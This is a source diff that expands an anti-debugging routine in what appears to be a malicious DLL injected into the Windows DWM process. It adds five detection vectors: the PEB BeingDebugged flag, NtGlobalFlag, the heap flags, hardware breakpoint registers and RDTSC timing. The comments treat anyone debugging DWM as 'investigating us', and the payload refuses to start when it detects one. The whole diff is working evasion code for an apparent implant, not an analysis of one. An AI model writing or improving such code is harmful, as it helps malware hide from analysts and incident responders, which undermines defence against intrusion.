@@ -293,11 +293,11 @@ static void wipe_pe_headers(HMODULE self) {
     }
 }
 
-/* ── Anti-debug — refuse to init if DWM is being debugged. This is
- * a very lightweight check: DWM is normally NOT debugged (that'd
- * require SYSTEM debug privileges + explicit attach). Anyone
- * debugging DWM is definitely investigating us. Returns 1 = safe,
- * 0 = debugged. */
+/* ── Anti-debug — refuse to init if DWM is being debugged. DWM is
+ * normally NOT debugged (that'd require SYSTEM debug privileges +
+ * explicit attach). Anyone debugging DWM is definitely investigating
+ * us. Multi-vector so an attacker who NOPs any one path is still
+ * caught by the others. Returns 1 = safe, 0 = debugged. */
 static int anti_debug_check(void) {
 #ifdef _WIN64
     BYTE *peb = (BYTE *)__readgsqword(0x60);
@@ -305,15 +305,100 @@ static int anti_debug_check(void) {
     BYTE *peb = (BYTE *)__readfsdword(0x30);
 #endif
     if (!peb) return 1;   /* uncertain — allow */
-    /* PEB->BeingDebugged is at offset 0x02 on both x86/x64. */
-    BYTE being_debugged = peb[0x02];
-    /* PEB->NtGlobalFlag at 0xBC (x86) or 0xBC (x64 wow) / 0x50BC (native x64).
-     * Actually x64 native it's at 0x158 — but checking is optional
-     * since BeingDebugged alone catches most cases. */
-    if (being_debugged) {
-        slog_write("payload.log", "anti_debug: BeingDebugged=1 — refusing init");
+
+    /* Vector 1: PEB->BeingDebugged at offset 0x02 (both x86/x64).
+     * IsDebuggerPresent() reads exactly this byte. */
+    if (peb[0x02]) {
+        slog_writef("payload.log", "adg: bd=1");
         return 0;
     }
+
+    /* Vector 2: PEB->NtGlobalFlag. When a process is created under a
+     * debugger the kernel sets FLG_HEAP_ENABLE_TAIL_CHECK (0x10) +
+     * FLG_HEAP_ENABLE_FREE_CHECK (0x20) + FLG_HEAP_VALIDATE_PARAMETERS
+     * (0x40) = 0x70. Not exhaustive but catches "started under a
+     * debugger" (as opposed to "attached later" which BeingDebugged
+     * catches). */
+#ifdef _WIN64
+    /* Native x64 PEB layout: NtGlobalFlag at 0xBC (v10.x) or 0x158
+     * (some older). Check the ULONG at 0xBC — safest position. */
+    ULONG ntgf = *(ULONG *)(peb + 0xBC);
+#else
+    ULONG ntgf = *(ULONG *)(peb + 0x68);
+#endif
+    if ((ntgf & 0x70) == 0x70) {
+        slog_writef("payload.log", "adg: ntgf=0x%lx", (unsigned long)ntgf);
+        return 0;
+    }
+
+    /* Vector 3: ProcessHeap->Flags / ForceFlags. Same debug-heap
+     * signature as NtGlobalFlag but stored per-heap. Requires reading
+     * PEB->ProcessHeap (offset 0x30 x64, 0x18 x86) then heap flags at
+     * +0x70 (Flags) and +0x74 (ForceFlags). Not-debugged process has
+     * both = 0x00000002 (HEAP_GROWABLE); debug adds
+     * HEAP_TAIL_CHECKING_ENABLED (0x20) + friends → typically
+     * 0x40000060 or similar. */
+    __try {
+#ifdef _WIN64
+        BYTE *heap = *(BYTE **)(peb + 0x30);
+#else
+        BYTE *heap = *(BYTE **)(peb + 0x18);
+#endif
+        if (heap) {
+            ULONG flags       = *(ULONG *)(heap + 0x70);
+            ULONG force_flags = *(ULONG *)(heap + 0x74);
+            /* HEAP_GROWABLE (0x2) is normal. Anything with the
+             * TAIL_CHECKING (0x20) or FREE_CHECKING (0x40) or
+             * VALIDATE_PARAMETERS (0x40000000) bits set is
+             * debug-heap. Force flags being non-zero at all is a
+             * strong debug signal. */
+            if (force_flags != 0 || (flags & 0x60000000) != 0) {
+                slog_writef("payload.log", "adg: heap fl=0x%lx ff=0x%lx",
+                            (unsigned long)flags, (unsigned long)force_flags);
+                return 0;
+            }
+        }
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        /* Heap layout is version-sensitive; if we can't read it
+         * safely, don't fail-closed — other vectors still cover. */
+    }
+
+    /* Vector 4: hardware breakpoint scan on our own thread. If a
+     * debugger set HW BPs on our DllMain / init_thread entry points
+     * before we ran the anti-debug check, DR0-DR3 will contain
+     * addresses. Real code path: DR0-DR3 all zero. */
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (GetThreadContext(GetCurrentThread(), &ctx)) {
+        if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
+            slog_writef("payload.log",
+                        "adg: hwbp Dr0=%p Dr1=%p Dr2=%p Dr3=%p",
+                        (void *)ctx.Dr0, (void *)ctx.Dr1,
+                        (void *)ctx.Dr2, (void *)ctx.Dr3);
+            return 0;
+        }
+    }
+
+    /* Vector 5: RDTSC differential across a NOP-op. Single-stepping
+     * debuggers show >>10000 cycles for what should be <500 cycles.
+     * Tolerant threshold — false positives on heavy load are worse
+     * than false negatives. Only trip on obvious step-through. */
+    unsigned __int64 t0 = __rdtsc();
+    /* A few cheap ops the compiler can't fold away. */
+    volatile int dummy = 0;
+    for (int i = 0; i < 8; i++) dummy = dummy + i;
+    (void)dummy;
+    unsigned __int64 t1 = __rdtsc();
+    unsigned __int64 delta = t1 - t0;
+    /* 500K cycles = ~150 µs on a 3.5 GHz CPU. Well beyond even a
+     * heavily-loaded system on a NOP-loop. Only tripped by a
+     * debugger single-stepping. */
+    if (delta > 500000ULL) {
+        slog_writef("payload.log", "adg: rdtsc delta=%llu",
+                    (unsigned long long)delta);
+        return 0;
+    }
+
     return 1;
 }
 
